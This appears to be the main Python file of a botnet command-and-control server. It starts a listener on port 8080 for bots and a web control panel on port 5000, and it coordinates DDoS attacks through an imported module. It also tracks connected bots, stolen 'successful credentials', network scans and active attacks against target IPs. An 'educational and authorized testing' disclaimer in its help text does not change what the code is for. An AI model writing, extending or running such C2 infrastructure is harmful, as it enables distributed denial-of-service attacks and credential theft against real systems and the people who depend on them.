#!/usr/bin/env python3
"""
Main C2 Server
Coordinates all server components for the attack bot system
"""

import threading
import time
import signal
import sys
from database import C2Database
from communication import C2CommunicationHandler
from ddos_coordinator import DDoSCoordinator
from web_ui import app, init_server_components

class C2Server:
    def __init__(self):
        """Initialize C2 Server with all components"""
        self.running = False
        self.db = C2Database()
        self.comm_handler = C2CommunicationHandler(db=self.db)
        self.ddos_coordinator = DDoSCoordinator(self.db, self.comm_handler)
        
        # Thread handles
        self.comm_thread = None
        self.web_thread = None
        self.cleanup_thread = None
        
        # Setup signal handlers
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def start(self):
        """Start all C2 server components"""
        try:
            print("=" * 60)
            print("           ATTACK BOT C2 SERVER STARTING")
            print("=" * 60)
            
            self.running = True
            
            # Start communication handler
            print("[+] Starting communication handler...")
            self.comm_thread = threading.Thread(
                target=self.comm_handler.start_server,
                daemon=True
            )
            self.comm_thread.start()
            time.sleep(1)  # Give it time to start
            
            # Start cleanup thread
            print("[+] Starting cleanup service...")
            self.cleanup_thread = threading.Thread(
                target=self.cleanup_service,
                daemon=True
            )
            self.cleanup_thread.start()
            
            # Initialize web UI components
            print("[+] Initializing web interface...")
            init_server_components()
            
            # Start web interface
            print("[+] Starting web interface...")
            self.web_thread = threading.Thread(
                target=lambda: app.run(host='0.0.0.0', port=5000, debug=False),
                daemon=True
            )
            self.web_thread.start()
            
            print("\n" + "=" * 60)
            print("           C2 SERVER OPERATIONAL")
            print("=" * 60)
            print(f"Communication Server: Port 8080")
            print(f"Web Interface: http://localhost:5000")
            print(f"Database: {self.db.db_path}")
            print("=" * 60)
            
            # Show initial statistics
            stats = self.db.get_statistics()
            print(f"\nCurrent Status:")
            print(f"  - Active Bots: {stats['active_bots']}")
            print(f"  - Successful Credentials: {stats['successful_credentials']}")
            print(f"  - Active Attacks: {stats['active_attacks']}")
            print(f"  - Recent Scans: {stats['recent_scans']}")
            
            print("\nWaiting for connections...")
            print("Press Ctrl+C to stop the server\n")
            
            # Keep main thread alive
            while self.running:
                time.sleep(1)
                
        except Exception as e:
            print(f"Error starting C2 server: {e}")
            self.stop()
    
    def stop(self):
        """Stop all C2 server components"""
        print("\n[!] Shutting down C2 server...")
        self.running = False
        
        # Stop communication handler
        if self.comm_handler:
            self.comm_handler.stop_server()
        
        # Stop all active attacks
        if self.ddos_coordinator:
            stopped_count = self.ddos_coordinator.stop_all_attacks()
            if stopped_count > 0:
                print(f"[+] Stopped {stopped_count} active attacks")
        
        print("[+] C2 server stopped")
        sys.exit(0)
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print(f"\n[!] Received signal {signum}")
        self.stop()
    
    def cleanup_service(self):
        """Background service for cleanup tasks"""
        while self.running:
            try:
                # Clean up inactive connections every 5 minutes
                self.comm_handler.cleanup_inactive_connections(timeout=300)
                
                # Sleep for 30 seconds before next cleanup cycle
                for _ in range(30):
                    if not self.running:
                        break
                    time.sleep(1)
                    
            except Exception as e:
                print(f"Error in cleanup service: {e}")
                time.sleep(10)
    
    def status(self):
        """Print current server status"""
        if not self.running:
            print("C2 Server is not running")
            return
        
        print("\n" + "=" * 40)
        print("         C2 SERVER STATUS")
        print("=" * 40)
        
        # Database statistics
        stats = self.db.get_statistics()
        print(f"Active Bots: {stats['active_bots']}")
        print(f"Successful Credentials: {stats['successful_credentials']}")
        print(f"Active Attacks: {stats['active_attacks']}")
        print(f"Recent Scans: {stats['recent_scans']}")
        
        # Connected bots
        connected_bots = self.comm_handler.get_connected_bots()
        print(f"Connected Bots: {len(connected_bots)}")
        if connected_bots:
            for bot in connected_bots:
                print(f"  - {bot}")
        
        # Active attacks
        active_attacks = self.ddos_coordinator.get_all_active_attacks()
        print(f"Active DDoS Attacks: {len(active_attacks)}")
        for attack in active_attacks:
            print(f"  - Attack {attack['attack_id']}: {attack['target_ip']}:{attack['target_port']} ({attack['attack_type']})")
        
        print("=" * 40)

def show_help():
    """Show help information"""
    print("""
C2 Server - Attack Bot Command & Control

Usage: python c2_server.py [command]

Commands:
    start    - Start the C2 server (default)
    help     - Show this help message

Features:
    - Bot communication and management
    - Credential storage and tracking
    - DDoS attack coordination
    - Web-based monitoring interface
    - Network scan result collection

Web Interface:
    Access the control panel at http://localhost:5000 after starting

Network Configuration:
    - Communication Port: 8080 (bots connect here)
    - Web Interface Port: 5000
    - Database: SQLite (c2_server.db)

For educational and authorized testing purposes only.
""")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1:
        command = sys.argv[1].lower()
        
        if command == "help":
            show_help()
            sys.exit(0)
        elif command != "start":
            print(f"Unknown command: {command}")
            print("Use 'help' for usage information")
            sys.exit(1)
    
    # Start the C2 server
    server = C2Server()
    server.start()